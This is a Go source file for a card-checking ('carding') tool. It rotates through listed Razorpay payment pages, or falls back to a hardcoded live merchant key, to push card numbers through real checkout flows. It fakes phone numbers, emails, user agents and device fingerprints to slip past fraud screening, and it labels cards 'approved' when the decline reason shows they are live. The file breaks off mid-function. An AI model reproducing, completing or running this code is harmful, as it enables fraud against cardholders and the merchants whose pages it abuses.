package main

import (
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// ============================================================
// CONSTANTS
// ============================================================
const (
	BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
	BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
	PORT     = 10000
)

// Multiple Razorpay sites - ye sab check honge
var razorpayURLs = []string{
	"https://pages.razorpay.com/pl_KjJwqXPzZv5R5k",
	"https://razorpay.me/@bharatkaaitech",
	"https://razorpay.me/@pathshalainc",
	"https://razorpay.me/@iiecm",
	"https://razorpay.me/@colorless",
	"https://razorpay.me/@ekalavyas",
	"https://razorpay.me/@specialtechno1119",
}

var (
	urlIndex   uint64
	proxyIndex uint64
)

// Fallback merchant data
var fallbackMerchant = map[string]string{
	"key_id":               "rzp_live_hrgl3RDoNMvCOs",
	"payment_link":         "pl_OzLkvRvf1drPps",
	"payment_page_item_id": "ppi_OzLkvSvf1drPpt",
	"keyless_header":       "api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==",
}

// Keywords for responses
var balanceKeywords = []string{
	"insufficient account balance", "insufficient funds",
	"maximum transaction limit", "transaction limit exceeded",
	"low balance", "not enough balance", "insufficient balance",
	"exceeds your limit", "daily limit exceeded",
}

var cvvKeywords = []string{
	"cvv provided is incorrect", "incorrect_cvv",
	"invalid cvv", "wrong cvv", "cvv is incorrect",
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(n.Int64()) + min
}

func genUA() string {
	major := randInt(120, 147)
	build := randInt(5000, 6999)
	patch := randInt(50, 249)
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

func genIndianPhone() string {
	first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
	rest := ""
	for i := 0; i < 9; i++ {
		rest += strconv.Itoa(randInt(0, 9))
	}
	return "+91" + first + rest
}

func genEmail() string {
	names := []string{"alex", "john", "mike", "sara", "david", "emma"}
	return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@gmail.com"
}

func getBrand(cc string) string {
	if strings.HasPrefix(cc, "4") {
		return "visa"
	}
	if len(cc) >= 2 {
		switch cc[:2] {
		case "51", "52", "53", "54", "55":
			return "mastercard"
		case "34", "37":
			return "amex"
		}
	}
	return "unknown"
}

func generateDeviceFingerprint() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, 128)
	for i := range result {
		result[i] = chars[randInt(0, len(chars)-1)]
	}
	return string(result)
}

func generateRzpDeviceID() (string, string) {
	buf := make([]byte, 16)
	rand.Read(buf)
	h := sha1.Sum(buf)
	hStr := hex.EncodeToString(h[:])
	ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
	rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
	return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
	const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 14)
	for i := 0; i < 14; i++ {
		n, _ := rand.Int(rand.Reader, big.NewInt(62))
		buf[i] = base62[n.Int64()]
	}
	return string(buf)
}

func findBetween(content, start, end string) string {
	si := strings.Index(content, start)
	if si == -1 {
		return ""
	}
	si += len(start)
	ei := strings.Index(content[si:], end)
	if ei == -1 {
		return ""
	}
	return content[si : si+ei]
}

func extractSessionToken(content string) string {
	if content == "" {
		return ""
	}

	token := findBetween(content, "window.session_token=\"", "\";")
	if token != "" && len(token) >= 40 {
		return token
	}

	patterns := []string{
		`session_token["']?\s*[:=]\s*["']([A-F0-9]{40,})["']`,
		`"session_token":"([A-F0-9]{40,})"`,
		`session_token=([A-F0-9]{40,})`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		match := re.FindStringSubmatch(content)
		if len(match) >= 2 && len(match[1]) >= 40 {
			return match[1]
		}
	}
	return ""
}

func extractJSONVar(content, varName string) string {
	prefix := "var " + varName + " ="
	startIdx := strings.Index(content, prefix)
	if startIdx == -1 {
		return ""
	}
	startIdx += len(prefix)

	for startIdx < len(content) {
		c := content[startIdx]
		if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
			break
		}
		startIdx++
	}

	if startIdx >= len(content) || content[startIdx] != '{' {
		return ""
	}

	depth := 0
	inString := false
	escaped := false

	for i := startIdx; i < len(content); i++ {
		c := content[i]

		if escaped {
			escaped = false
			continue
		}
		if c == '\\' && inString {
			escaped = true
			continue
		}
		if c == '"' {
			inString = !inString
			continue
		}
		if inString {
			continue
		}
		if c == '{' {
			depth++
		} else if c == '}' {
			depth--
			if depth == 0 {
				return content[startIdx : i+1]
			}
		}
	}
	return ""
}

func maskCard(card string) string {
	if len(card) <= 8 {
		return card
	}
	return card[:6] + "******" + card[len(card)-4:]
}

// ============================================================
// HTTP CLIENT
// ============================================================

type FetchResponse struct {
	Body       string
	StatusCode int
	Headers    http.Header
}

type CustomFetch struct {
	client *http.Client
	ua     string
}

func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
	jar, _ := cookiejar.New(nil)

	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 10,
		IdleConnTimeout:     90 * time.Second,
	}

	if proxyURL != "" {
		parsed, err := url.Parse(proxyURL)
		if err == nil {
			transport.Proxy = http.ProxyURL(parsed)
		}
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   45 * time.Second,
	}

	if ua == "" {
		ua = genUA()
	}

	return &CustomFetch{client: client, ua: ua}, nil
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
	req, err := http.NewRequest(method, targetURL, body)
	if err != nil {
		return nil, err
	}

	if _, ok := headers["User-Agent"]; !ok {
		req.Header.Set("User-Agent", f.ua)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return &FetchResponse{
		Body:       string(respBody),
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
	}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
	return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
	jsonBytes, _ := json.Marshal(payload)
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		headers["Content-Type"] = "application/json"
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		headers["Content-Type"] = "application/x-www-form-urlencoded"
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

// ============================================================
// CARD CHECK FUNCTIONS
// ============================================================

type CheckResult struct {
	Status      string `json:"status"`
	Message     string `json:"message"`
	SiteUsed    string `json:"site_used"`
	Proxy       string `json:"proxy"`
	ProxyStatus string `json:"proxy_status"`
}

func getNextURL() string {
	idx := atomic.AddUint64(&urlIndex, 1) - 1
	return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

func getStringFromMap(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	v, ok := m[key]
	if !ok {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if m == nil {
		return 0
	}
	v, ok := m[key]
	if !ok {
		return 0
	}
	switch val := v.(type) {
	case float64:
		return val
	case int:
		return float64(val)
	case string:
		f, _ := strconv.ParseFloat(val, 64)
		return f
	}
	return 0
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen]
}

func isBalanceKeyword(msgLower string) bool {
	for _, k := range balanceKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

func isCVVKeyword(msgLower, errCode string) bool {
	for _, k := range cvvKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return strings.ToLower(errCode) == "incorrect_cvv"
}

// ============================================================
// MAIN CHECK FUNCTION
// ============================================================

func checkCardOnSite(cc, mm, yy, cvv, siteURL string) CheckResult {
	yy2 := yy
	if len(yy) == 4 {
		yy2 = yy[2:]
	}
	year, _ := strconv.Atoi("20" + yy2)
	brand := getBrand(cc)
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()

	rzpDeviceID, fhash := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	fetch, err := NewCustomFetch("", ua)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL, ProxyStatus: "NO_PROXY"}
	}
	defer fetch.client.CloseIdleConnections()

	// Extract merchant data
	r1, err := fetch.Get(siteURL, map[string]string{
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	})
	if err != nil {
		return CheckResult{Status: "error", Message: "Failed to fetch site", SiteUsed: siteURL, ProxyStatus: "NO_PROXY"}
	}

	jsonStr := extractJSONVar(r1.Text(), "data")
	if jsonStr == "" {
		// Fallback merchant data
		return checkWithFallback(cc, mm, yy, cvv, siteURL)
	}

	var initData map[string]interface{}
	if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
		return checkWithFallback(cc, mm, yy, cvv, siteURL)
	}

	kyid := getStringFromMap(initData, "key_id")
	if kyid == "" {
		kyid = getStringFromMap(initData, "key")
	}
	if kyid == "" {
		return checkWithFallback(cc, mm, yy, cvv, siteURL)
	}

	var plink, ppid string
	const forceAmount float64 = 100

	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
		plink = getStringFromMap(plObj, "id")
		if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	} else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
		plink = getStringFromMap(ppObj, "id")
		if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	}

	if plink == "" {
		return checkWithFallback(cc, mm, yy, cvv, siteURL)
	}

	keylessHeader := getStringFromMap(initData, "keyless_header")
	if keylessHeader == "" {
		keylessHeader = fallbackMerchant["keyless_header"]
	}

	// Create order
	r2Payload := map[string]interface{}{
		"notes":      map[string]string{"comment": "", "name": "User"},
		"line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
		map[string]string{
			"Accept":       "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin":       "https://pages.razorpay.com",
			"Referer":      "https://pages.razorpay.com/",
		},
		r2Payload,
	)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL}
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
		return CheckResult{Status: "error", Message: "Order parse failed", SiteUsed: siteURL}
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	orderID := getStringFromMap(orderObj, "id")
	if orderID == "" {
		return CheckResult{Status: "error", Message: "Order creation failed", SiteUsed: siteURL}
	}

	checkoutID := orderID
	if idx := strings.Index(orderID, "_"); idx != -1 {
		checkoutID = orderID[idx+1:]
	}
	orderAmount := getFloatFromMap(orderObj, "amount")
	if orderAmount < 100 {
		orderAmount = forceAmount
	}
	orderCurrency := getStringFromMap(orderObj, "currency")
	if orderCurrency == "" {
		orderCurrency = "INR"
	}

	// Get session token
	params3 := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {keylessHeader},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get(
		"https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
		map[string]string{
			"Accept":  "text/html,application/xhtml+xml,*/*",
			"Referer": "https://pages.razorpay.com/",
		},
	)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL}
	}

	sessid := extractSessionToken(r3.Text())
	if sessid == "" {
		return CheckResult{Status: "error", Message: "Session token not found", SiteUsed: siteURL}
	}

	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
		BUILD, BUILD_V1, rzpSessionID, sessid)

	stdHeaders := func() map[string]string {
		return map[string]string{
			"Accept":          "*/*",
			"Origin":          "https://api.razorpay.com",
			"Referer":         rzpRef,
			"x-session-token": sessid,
		}
	}

	// Send preferences
	{
		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
		queryArr := make([]map[string]string, 0, len(resources))
		for _, r := range resources {
			queryArr = append(queryArr, map[string]string{"resource": r})
		}

		r4Payload := map[string]interface{}{
			"query": queryArr,
			"query_params": map[string]interface{}{
				"device_id":       rzpDeviceID,
				"rtb_device_id":   fhash,
				"amount":          orderAmount,
				"currency":        orderCurrency,
				"option_currency": orderCurrency,
				"truecaller":      false,
				"qr_required":     false,
				"library":         "checkoutjs",
				"platform":        "browser",
				"order_id":        orderID,
				"payment_link_id": plink,
				"contact":         phone,
			},
			"action": "get",
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
			h, r4Payload,
		)
	}

	// Send checkout order
	{
		form5 := url.Values{
			"notes[email]":          {email},
			"notes[phone]":          {phoneShort},
			"payment_link_id":       {plink},
			"key_id":                {kyid},
			"contact":               {phone},
			"email":                 {email},
			"currency":              {orderCurrency},
			"_[integration]":        {"payment_pages"},
			"_[device.id]":          {rzpDeviceID},
			"_[library]":            {"checkoutjs"},
			"_[library_src]":        {"no-src"},
			"_[current_script_src]": {"no-src"},
			"_[platform]":           {"browser"},
			"_[env]":                {""},
			"_[is_magic_script]":    {"false"},
			"_[os]":                 {"windows"},
			"_[shield][fhash]":      {fhash},
			"_[shield][tz]":         {"0"},
			"_[device_id]":          {rzpDeviceID},
			"_[build]":              {BUILD},
			"_[shield][os]":         {"windows"},
			"_[shield][platform]":   {"browser"},
			"_[shield][browser]":    {"chrome"},
			"_[request_index]":      {"0"},
			"amount":                {fmt.Sprintf("%.0f", orderAmount)},
			"order_id":              {orderID},
			"method":                {"card"},
			"checkout_id":           {checkoutID},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/x-www-form-urlencoded"
		fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeader),
			h, form5,
		)
	}

	// Send cross border
	{
		r6Payload := map[string]interface{}{
			"identifiers": map[string]interface{}{
				"merchant":         map[string]string{"country": "IN"},
				"card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
				"method":           "card",
				"payment_currency": orderCurrency,
			},
			"forex_charges": map[string]interface{}{
				"amount":   orderAmount,
				"currency": orderCurrency,
				"filters":  map[string]string{"method": "card"},
			},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, url.QueryEscape(keylessHeader)),
			h, r6Payload,
		)
	}

	time.Sleep(time.Duration(randInt(1000, 2000)) * time.Millisecond)

	// Submit payment
	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))

	form7 := url.Values{
		"user_risk_providers_token": {tokenCreate},
		"notes[comment]":            {""},
		"notes[email]":              {email},
		"notes[phone]":              {phoneShort},
		"notes[name]":               {"User"},
		"payment_link_id":           {plink},
		"key_id":                    {kyid},
		"contact":                   {phone},
		"email":                     {email},
		"currency":                  {orderCurrency},
		"_[integration]":            {"payment_pages"},
		"_[checkout_id]":            {checkoutID},
		"_[device.id]":              {rzpDeviceID},
		"_[env]":                    {""},
		"_[library]":                {"checkoutjs"},
		"_[library_src]":            {"no-src"},
		"_[current_script_src]":     {"no-src"},
		"_[is_magic_script]":        {"false"},
		"_[platform]":               {"browser"},
		"_[referer]":                {siteURL},
		"_[shield][fhash]":          {fhash},
		"_[shield][tz]":             {"-330"},
		"_[device_id]":              {rzpDeviceID},
		"_[build]":                  {BUILD},
		"_[shield][os]":             {"windows"},
		"_[shield][platform]":       {"browser"},
		"_[shield][browser]":        {"chrome"},
		"_[request_index]":          {"1"},
		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":                  {orderID},
		"method":                    {"card"},
		"card[number]":              {cc},
		"card[cvv]":                 {cvv},
		"card[name]":                {"User"},
		"card[expiry_month]":        {mm},
		"card[expiry_year]":         {strconv.Itoa(year)},
		"save":                      {"0"},
		"dcc_currency":              {orderCurrency},
	}

	r7, err := fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
		stdHeaders(),
		form7,
	)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL}
	}

	var r7Data map[string]interface{}
	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
		return CheckResult{Status: "error", Message: "Payment response parse failed", SiteUsed: siteURL}
	}

	paymentID := getStringFromMap(r7Data, "payment_id")
	if paymentID == "" {
		paymentID = getStringFromMap(r7Data, "id")
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		errDesc := getStringFromMap(errObj, "description")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getStringFromMap(errObj, "reason")

		label := errDesc
		if errCode != "" {
			label = errDesc + " (" + errCode + ")"
		}

		if isBalanceKeyword(strings.ToLower(errDesc)) || isCVVKeyword(strings.ToLower(errDesc), errCode) {
			return CheckResult{Status: "approved", Message: label, SiteUsed: siteURL}
		}
		return CheckResult{Status: "declined", Message: label, SiteUsed: siteURL}
	}

	return CheckResult{Status: "charged", Message: "Payment Successful", SiteUsed: siteURL}
}

func checkWithFallback(cc, mm, yy, cvv, siteURL string) CheckResult {
	// Use fallback merchant data
	year, _ := strconv.Atoi("20" + yy)
	brand := getBrand(cc)
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()

	rzpDeviceID, fhash := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	fetch, err := NewCustomFetch("", ua)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL}
	}
	defer fetch.client.CloseIdleConnections()

	kyid := fallbackMerchant["key_id"]
	plink := fallbackMerchant["payment_link"]
	ppid := fallbackMerchant["payment_page_item_id"]
	keylessHeader := fallbackMerchant["keyless_header"]

	// Create order
	r2Payload := map[string]interface{}{
		"notes":      map[string]string{"comment": "", "name": "User"},
		"line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": 100}},
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
		map[string]string{
			"Accept":       "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin":       "https://pages.razorpay.com",
			"Referer":      "https://pages.razorpay.com/",
		},
		r2Payload,
	)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL}
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
		return CheckResult{Status: "error", Message: "Order parse failed", SiteUsed: siteURL}
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	orderID := getStringFromMap(orderObj, "id")
	if orderID == "" {
		return CheckResult{Status: "error", Message: "Order creation failed", SiteUsed: siteURL}
	}

	checkoutID := orderID
	if idx := strings.Index(orderID, "_"); idx != -1 {
		checkoutID = orderID[idx+1:]
	}
	orderAmount := getFloatFromMap(orderObj, "amount")
	if orderAmount < 100 {
		orderAmount = 100
	}
	orderCurrency := getStringFromMap(orderObj, "currency")
	if orderCurrency == "" {
		orderCurrency = "INR"
	}

	// Get session token
	params3 := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {keylessHeader},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get(
		"https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
		map[string]string{
			"Accept":  "text/html,application/xhtml+xml,*/*",
			"Referer": "https://pages.razorpay.com/",
		},
	)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL}
	}

	sessid := extractSessionToken(r3.Text())
	if sessid == "" {
		return CheckResult{Status: "error", Message: "Session token not found", SiteUsed: siteURL}
	}

	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
		BUILD, BUILD_V1, rzpSessionID, sessid)

	stdHeaders := func() map[string]string {
		return map[string]string{
			"Accept":          "*/*",
			"Origin":          "https://api.razorpay.com",
			"Referer":         rzpRef,
			"x-session-token": sessid,
		}
	}

	// Send preferences
	{
		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
		queryArr := make([]map[string]string, 0, len(resources))
		for _, r := range resources {
			queryArr = append(queryArr, map[string]string{"resource": r})
		}

		r4Payload := map[string]interface{}{
			"query": queryArr,
			"query_params": map[string]interface{}{
				"device_id":       rzpDeviceID,
				"rtb_device_id":   fhash,
				"amount":          orderAmount,
				"currency":        orderCurrency,
				"option_currency": orderCurrency,
				"truecaller":      false,
				"qr_required":     false,
				"library":         "checkoutjs",
				"platform":        "browser",
				"order_id":        orderID,
				"payment_link_id": plink,
				"contact":         phone,
			},
			"action": "get",
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
			h, r4Payload,
		)
	}

	// Send checkout order
	{
		form5 := url.Values{
			"notes[email]":          {email},
			"notes[phone]":          {phoneShort},
			"payment_link_id":       {plink},
			"key_id":                {kyid},
			"contact":               {phone},
			"email":                 {email},
			"currency":              {orderCurrency},
			"_[integration]":        {"payment_pages"},
			"_[device.id]":          {rzpDeviceID},
			"_[library]":            {"checkoutjs"},
			"_[library_src]":        {"no-src"},
			"_[current_script_src]": {"no-src"},
			"_[platform]":           {"browser"},
			"_[env]":                {""},
			"_[is_magic_script]":    {"false"},
			"_[os]":                 {"windows"},
			"_[shield][fhash]":      {fhash},
			"_[shield][tz]":         {"0"},
			"_[device_id]":          {rzpDeviceID},
			"_[build]":              {BUILD},
			"_[shield][os]":         {"windows"},
			"_[shield][platform]":   {"browser"},
			"_[shield][browser]":    {"chrome"},
			"_[request_index]":      {"0"},
			"amount":                {fmt.Sprintf("%.0f", orderAmount)},
			"order_id":              {orderID},
			"method":                {"card"},
			"checkout_id":           {checkoutID},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/x-www-form-urlencoded"
		fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeader),
			h, form5,
		)
	}

	// Send cross border
	{
		r6Payload := map[string]interface{}{
			"identifiers": map[string]interface{}{
				"merchant":         map[string]string{"country": "IN"},
				"card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
				"method":           "card",
				"payment_currency": orderCurrency,
			},
			"forex_charges": map[string]interface{}{
				"amount":   orderAmount,
				"currency": orderCurrency,
				"filters":  map[string]string{"method": "card"},
			},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, url.QueryEscape(keylessHeader)),
			h, r6Payload,
		)
	}

	time.Sleep(time.Duration(randInt(1000, 2000)) * time.Millisecond)

	// Submit payment
	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))

	form7 := url.Values{
		"user_risk_providers_token": {tokenCreate},
		"notes[comment]":            {""},
		"notes[email]":              {email},
		"notes[phone]":              {phoneShort},
		"notes[name]":               {"User"},
		"payment_link_id":           {plink},
		"key_id":                    {kyid},
		"contact":                   {phone},
		"email":                     {email},
		"currency":                  {orderCurrency},
		"_[integration]":            {"payment_pages"},
		"_[checkout_id]":            {checkoutID},
		"_[device.id]":              {rzpDeviceID},
		"_[env]":                    {""},
		"_[library]":                {"checkoutjs"},
		"_[library_src]":            {"no-src"},
		"_[current_script_src]":     {"no-src"},
		"_[is_magic_script]":        {"false"},
		"_[platform]":               {"browser"},
		"_[referer]":                {siteURL},
		"_[shield][fhash]":          {fhash},
		"_[shield][tz]":             {"-330"},
		"_[device_id]":              {rzpDeviceID},
		"_[build]":                  {BUILD},
		"_[shield][os]":             {"windows"},
		"_[shield][platform]":       {"browser"},
		"_[shield][browser]":        {"chrome"},
		"_[request_index]":          {"1"},
		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":                  {orderID},
		"method":                    {"card"},
		"card[number]":              {cc},
		"card[cvv]":                 {cvv},
		"card[name]":                {"User"},
		"card[expiry_month]":        {mm},
		"card[expiry_year]":         {strconv.Itoa(year)},
		"save":                      {"0"},
		"dcc_currency":              {orderCurrency},
	}

	r7, err := fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
		stdHeaders(),
		form7,
	)
	if err != nil {
		return CheckResult{Status: "error", Message: err.Error(), SiteUsed: siteURL}
	}

	var r7Data map[string]interface{}
	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
		return CheckResult{Status: "error", Message: "Payment response parse failed", SiteUsed: siteURL}
	}

	paymentID := getStringFromMap(r7Data, "payment_id")
	if paymentID == "" {
		paymentID = getStringFromMap(r7Data, "id")
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		errDesc := getStringFromMap(errObj, "description")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getStringFromMap(errObj, "reason")

		label := errDesc
		if errCode != "" {
			label = errDesc + " (" + errCode + ")"
		}

		if isBalanceKeyword(strings.ToLower(errDesc)) || isCVVKeyword(strings.ToLower(errDesc), errCode) {
			return CheckResult{Status: "approved", Message: label, SiteUsed: siteURL}
		}
		return CheckResult{Status: "declined", Message: label, SiteUsed: siteURL}
	}

	return CheckResult{Status: "charged", Message: "Payment Successful", SiteUsed: siteURL}
}

// ============================================================
// API HANDLERS
// ============================================================

type ParsedCard struct {
	CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
	cardData = strings.TrimSpace(cardData)
	separators := []string{"|", "/", " ", ",", ":", "-", "_"}

	for _, sep := range separators {
		parts := strings.Split(cardData, sep)
		if len(parts) >= 4 {
			cc := strings.TrimSpace(parts[0])
			mm := strings.TrimSpace(parts[1])
			yy := strings.TrimSpace(parts[2])
			cvv := strings.TrimSpace(parts[3])

			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
				mmInt, _ := strconv.Atoi(mm)
				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
					yy2 := yy
					if len(yy2) == 4 {
						yy2 = yy2[2:]
					}
					return &ParsedCard{
						CC:  cc,
						MM:  fmt.Sprintf("%02d", mmInt),
						YY:  yy2,
						CVV: cvv,
					}, nil
				}
			}
		}
	}
